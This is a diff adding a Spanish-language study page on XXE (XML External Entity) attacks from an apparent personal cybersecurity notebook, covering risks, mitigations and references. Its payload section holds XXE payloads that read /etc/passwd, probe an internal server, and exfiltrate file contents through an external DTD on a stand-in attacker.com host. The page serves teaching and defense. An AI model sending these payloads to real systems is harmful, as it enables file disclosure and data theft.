@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE (XML External Entity) - Teoría</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>XXE (XML External Entity)</h1>
+        <nav>
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="dashboard.html">Máquinas Resueltas</a></li>
+                <li><a href="theory.html">Teoría</a></li>
+                <li><a href="writeup.html">Nuevo Write-up</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <article class="theory-content">
+            <section class="theory-intro">
+                <h2>Descripción Técnica</h2>
+                <p>XML External Entity (XXE) es una vulnerabilidad que permite a un atacante interferir con el procesamiento de datos XML por parte de una aplicación. Permite la inclusión de entidades externas que pueden conducir a la divulgación de archivos del sistema, escaneo de puertos internos o ejecución remota de código.</p>
+            </section>
+
+            <section class="theory-details">
+                <h2>Cuándo se Usa</h2>
+                <ul>
+                    <li>Aplicaciones que procesan datos XML</li>
+                    <li>APIs SOAP</li>
+                    <li>Documentos Office (docx, xlsx)</li>
+                    <li>Formatos como SVG, RSS</li>
+                    <li>Cualquier endpoint que acepte XML</li>
+                </ul>
+
+                <h2>Riesgos</h2>
+                <ul>
+                    <li>Lectura de archivos del sistema</li>
+                    <li>Escaneo de puertos internos</li>
+                    <li>Ejecución remota de código</li>
+                    <li>Denegación de servicio</li>
+                    <li>Exfiltración de datos</li>
+                </ul>
+            </section>
+
+            <section class="theory-commands">
+                <h2>Payloads Comunes</h2>
+                
+                <h3>Lectura de Archivos</h3>
+                <div class="code-block">
+                    <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+                </div>
+
+                <h3>SSRF a través de XXE</h3>
+                <div class="code-block">
+                    <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY xxe SYSTEM "http://internal-server:8080/"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+                </div>
+
+                <h3>XXE OOB (Out-of-Band)</h3>
+                <div class="code-block">
+                    <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
+%remote;
+]&gt;
+&lt;root&gt;&amp;exfil;&lt;/root&gt;</code></pre>
+                    
+                    <p>evil.dtd:</p>
+                    <pre><code class="language-xml">&lt;!ENTITY % payload SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://attacker.com/?data=%payload;'&gt;"&gt;
+%param1;</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-examples">
+                <h2>Ejemplos de Laboratorio</h2>
+                
+                <h3>Entorno Seguro</h3>
+                <ul>
+                    <li>PortSwigger Web Security Academy</li>
+                    <li>bWAPP</li>
+                    <li>VulnHub machines with XXE</li>
+                </ul>
+
+                <h3>Detección</h3>
+                <div class="code-block">
+                    <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE test [&lt;!ENTITY xxe "test"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-mitigation">
+                <h2>Mitigaciones</h2>
+                <ul>
+                    <li>Deshabilitar el procesamiento de entidades externas</li>
+                    <li>Usar formatos de datos más seguros (JSON)</li>
+                    <li>Validación de esquemas XML</li>
+                    <li>Configuración segura de parsers XML</li>
+                    <li>WAF con protección XXE</li>
+                </ul>
+            </section>
+
+            <section class="related-writeups">
+                <h2>Write-ups Relacionados</h2>
+                <div id="xxe-writeups-list"></div>
+            </section>
+
+            <section class="theory-references">
+                <h2>Referencias</h2>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger XXE</a></li>
+                    <li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">OWASP XXE</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank">OWASP XXE Prevention Cheat Sheet</a></li>
+                </ul>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        <p>Cuaderno Personal de Ciberseguridad &copy; 2025</p>
+        <p class="warning">Recuerda redactar información sensible antes de publicar</p>
+    </footer>
+
+    <script src="js/theory.js"></script>
+</body>
+</html>
